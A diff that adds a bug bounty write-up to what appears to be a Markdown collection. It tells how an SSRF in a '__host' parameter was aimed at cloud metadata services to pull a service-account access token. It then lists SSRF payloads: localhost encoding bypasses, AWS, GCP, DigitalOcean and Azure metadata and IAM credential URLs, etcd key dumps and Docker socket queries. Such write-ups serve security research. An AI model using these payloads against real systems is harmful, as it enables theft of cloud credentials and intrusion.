@@ -109,6 +109,136 @@ Token=28907420839252952&OrderId=51489803&TerminalNo=8521900539207&RRN=7438075480
 ![open-redirect](https://github.com/user-attachments/assets/8b4b6362-0b5d-4036-beea-51eff948f627)
 
 
+## SSRF to leaking access token and other sensitive information
+1. Use `cat waybackurl | gf ssrf`
+2.  I tried testing ssrf, So I quickly opened my Burpsuite and put the burp collaborator link in the `__host` field and send the request, I clicked on poll now button and yes I got an HTTP interaction and the burp collaborator response was reflected on the screen
+
+![ssrf-1](https://github.com/user-attachments/assets/14397651-6b2e-406c-8566-50137f416c0d)
+
+3. I tried **XSS** with it by firing up an Apache server and uploading alert JavaScript payload / But i stopped because XSS won’t be so impactful and started to look for **ssrf**, In the `__host` parameter I put `169.254.169.254` and in the url I added `/latest/meta-data/iam/security-credentials/`
+
+```html
+https://redacted.redacted.com/latest/meta-data/iam/security-credentials/?__host=169.254.169.254&__proto=https
+```
+
+4. Sent the request. But it returned **502 BAD Gateway** I then changed `__proto` value to http but it didn’t either worked
+5. Then I though of why not try other endpoints like google, digital ocean one’s
+
+![ssrf-2](https://github.com/user-attachments/assets/cf53ed8a-b5a0-47fd-a93d-ce800bd8c38b)
+
+
+6. So I quickly added this header and set the value of it to Google and send the request and yesss!! it did work
+7. I then tried to get access token using
+```html
+GET /computeMetadata/v1/instance/service-accounts/default/token?__host=169.254.169.254&__proto=http
+```
+8. I screamed woah!! I got it, SSRF achieved
+
+![ssrf-final](https://github.com/user-attachments/assets/6c546428-667a-41ec-9df7-e8f34acf84fa)
+
+```text
+# The payloads that are used by hackers to detect SSRF on a web application are given below:
+# Basic SSRF
+http://127.0.0.1:80
+http://127.0.0.1:443
+http://127.0.0.1:22
+http://0.0.0.0:80
+http://0.0.0.0:443
+http://0.0.0.0:22
+http://localhost:80
+http://localhost:443
+http://localhost:22
+
+# SSRF using Various Encoding
+1. Hex Encoding like using :
+127.0.0.1 to 0x7f.0x0.0x0.0x1
+localhost to 6C6F63616C686F7374
+
+2. Octal Encoding like using :
+127.0.0.1 translates to 0177.0.0.01
+
+3. Dword Encoding is "Double Word" or 32-bit integer
+http://127.0.0.1 to http://2130706433
+
+4. URL Encoding :
+http://localhost to http://%6c%6f%63%61%6c%68%6f%73%74
+
+# SSRF To XSS
+1. http://brutelogic.com.br/poc.svg -> simple alert
+
+# Bypass localhost with [::]
+http://[::]:80/
+http://[::]:25/ SMTP
+http://[::]:22/ SSH
+http://[::]:3128/ Squid
+http://0000::1:80/
+http://0000::1:25/ SMTP
+http://0000::1:22/ SSH
+http://0000::1:3128/ Squid
+
+# Alternate IP encoding
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
+http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
+http://169.254.169.254/latest/meta-data/ami-id
+http://169.254.169.254/latest/meta-data/reservation-id
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/meta-data/public-keys/
+http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
+http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
+http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
+http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
+http://169.254.169.254/latest/dynamic/instance-identity/document
+
+# SSRF URL for AWS Elastic Beanstalk
+Requires the header “Metadata-Flavor: Google” or “X-Google-Metadata-Request: True”
+http://169.254.169.254/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/hostname
+http://metadata.google.internal/computeMetadata/v1/instance/id
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+Google allows recursive pulls
+http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
+http://metadata.google.internal/computeMetadata/v1beta1/
+http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
+
+# SSRF URL for Digital Ocean
+Documentation available at https://developers.digitalocean.com/documentation/metadata/
+curl http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1.json
+http://169.254.169.254/metadata/v1/
+http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1/user-data
+http://169.254.169.254/metadata/v1/hostname
+http://169.254.169.254/metadata/v1/region
+http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address
+
+# SSRF URL for Azure
+Limited, maybe more exists?
+https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/
+http://169.254.169.254/metadata/v1/maintenance
+Update Apr 2017, Azure has more support; requires the header “Metadata: true”
+https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service
+http://169.254.169.254/metadata/instance?api-version=2017-04-02
+http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=20
+17-04-02&format=text
+
+# SSRF URL for Kubernetes ETCD
+Can contain API keys and internal ip and ports
+curl -L http://127.0.0.1:2379/version
+curl http://127.0.0.1:2379/v2/keys/?recursive=true
+
+# SSRF URL for Docker
+http://127.0.0.1:2375/v1.24/containers/json
+Simple example
+docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash
+bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json
+bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json
+
+```
 
 
 
